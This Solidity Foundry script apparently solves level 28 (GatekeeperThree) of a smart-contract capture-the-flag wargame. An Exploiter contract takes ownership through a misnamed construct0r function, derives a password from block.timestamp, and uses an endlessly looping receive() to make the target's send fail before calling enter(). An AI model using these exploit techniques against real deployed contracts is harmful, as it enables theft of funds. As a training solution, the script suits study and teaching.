pragma solidity ^0.8.0;
import "../instances/Ilevel28.sol";
import "forge-std/Script.sol";

contract Level28 is Script {
    GatekeeperThree level28 =
        GatekeeperThree(payable(0xA1077AFfC324E80298AAd55b2C95e8402e3edB04));

    function run() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        Exploiter exploiter = new Exploiter();
        exploiter.exploit{value: 0.0011 ether}(payable(address(level28)));
        require(level28.entrant() == attacker, "Level28: Failed to enter");
        vm.stopBroadcast();
    }
}

contract Exploiter {
    GatekeeperThree gatekeeper;

    function exploit(address payable _target) external payable {
        require(msg.value > 0.001 ether, "Level28: Not enough funds");
        gatekeeper = GatekeeperThree(_target);
        gatekeeper.createTrick();
        // gateOne
        gatekeeper.construct0r();
        // gateTwo
        uint payloadPassword = block.timestamp;
        gatekeeper.getAllowance(payloadPassword); // fail and should set the password
        // gateThree
        payable(address(gatekeeper)).call{value: msg.value}("");
        if (!(address(gatekeeper).balance > 0.001 ether)) {
            revert("Level28: Failed to trigger gateThree");
        }
        // enter
        gatekeeper.enter();
    }

    receive() external payable {
        // out of gas, make `send` fail
        while (true) {}
    }
}
